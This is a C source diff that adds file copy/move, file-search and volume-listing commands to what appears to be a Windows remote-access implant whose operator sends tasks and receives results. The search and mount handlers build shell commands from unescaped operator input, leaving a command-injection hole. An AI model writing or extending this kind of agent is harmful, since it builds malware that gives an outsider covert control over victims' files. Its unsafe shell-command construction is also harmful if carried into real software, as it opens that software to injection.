@@ -2258,6 +2258,56 @@ void dispatch_task(AgentTask *task) {
             }
         }
     }
+    else if (strcmp(type_upper, "CP") == 0 || strcmp(type_upper, "MV") == 0) {
+        char src[MAX_PATH] = {0}, dst[MAX_PATH] = {0};
+        json_get_str(args, "src", src, sizeof(src), "");
+        json_get_str(args, "dst", dst, sizeof(dst), "");
+        if (!src[0] || !dst[0]) {
+            agent_send_result(task->id, "", "usage: {src,dst}");
+        } else {
+            BOOL ok;
+            if (strcmp(type_upper, "CP") == 0)
+                ok = CopyFileA(src, dst, FALSE);
+            else
+                ok = MoveFileExA(src, dst, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING);
+            if (ok) agent_send_result(task->id, "[+] filesystem operation completed", "");
+            else {
+                char err[96];
+                snprintf(err, sizeof(err), "%s: error %lu", type_upper, GetLastError());
+                agent_send_result(task->id, "", err);
+            }
+        }
+    }
+    else if (strcmp(type_upper, "GREP") == 0) {
+        char pattern[512] = {0}, path[MAX_PATH] = {0};
+        json_get_str(args, "pattern", pattern, sizeof(pattern), "");
+        json_get_str(args, "path", path, sizeof(path), ".");
+        if (!pattern[0]) {
+            agent_send_result(task->id, "", "usage: {pattern,path}");
+        } else {
+            char cmd[MAX_PATH + sizeof(pattern) + 64];
+            snprintf(cmd, sizeof(cmd), "findstr /spin /c:\"%s\" \"%s\"", pattern, path);
+            char *out = run_shell(cmd);
+            agent_send_result(task->id, out ? out : "", "");
+            free(out);
+        }
+    }
+    else if (strcmp(type_upper, "MOUNT") == 0) {
+        char path[MAX_PATH] = {0};
+        if (args[0] == '{') json_get_str(args, "path", path, sizeof(path), "");
+        else strncpy(path, args, sizeof(path) - 1);
+        char cmd[MAX_PATH + 32];
+        if (path[0]) snprintf(cmd, sizeof(cmd), "mountvol \"%s\" /L", path);
+        else snprintf(cmd, sizeof(cmd), "mountvol");
+        char *out = run_shell(cmd);
+        agent_send_result(task->id, out ? out : "", "");
+        free(out);
+    }
+    else if (strcmp(type_upper, "CHMOD") == 0 ||
+             strcmp(type_upper, "CHOWN") == 0 ||
+             strcmp(type_upper, "CHTIMES") == 0) {
+        agent_send_result(task->id, "", "filesystem metadata operation is not supported on Windows");
+    }
     else if (strcmp(type_upper, "UPLOAD") == 0) {
         // args = JSON {"filename":"...","remote_path":"..."}
         char filename[256] = {0}, remote_path[MAX_PATH] = {0};
